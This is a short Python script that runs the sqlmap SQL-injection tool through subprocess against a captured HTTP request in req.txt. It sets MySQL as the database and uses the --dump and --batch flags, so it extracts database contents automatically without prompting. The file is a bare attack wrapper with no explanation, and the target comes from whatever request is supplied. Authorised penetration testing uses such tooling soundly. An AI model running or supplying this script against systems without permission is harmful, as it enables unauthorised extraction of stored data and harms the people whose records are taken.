import subprocess

# Run the sqlmap command
def run_sqlmap():
    print("[*] Running sqlmap...")
    # Run sqlmap and wait for it to finish
    subprocess.run([
        "sqlmap", "-r", "req.txt", "--dbms=MySQL", "--level=1", "--risk=1", "--dump", "--batch"
    ])

# Main function
def main():
    run_sqlmap()  # Run sqlmap and wait for it to finish

if __name__ == "__main__":
    main()
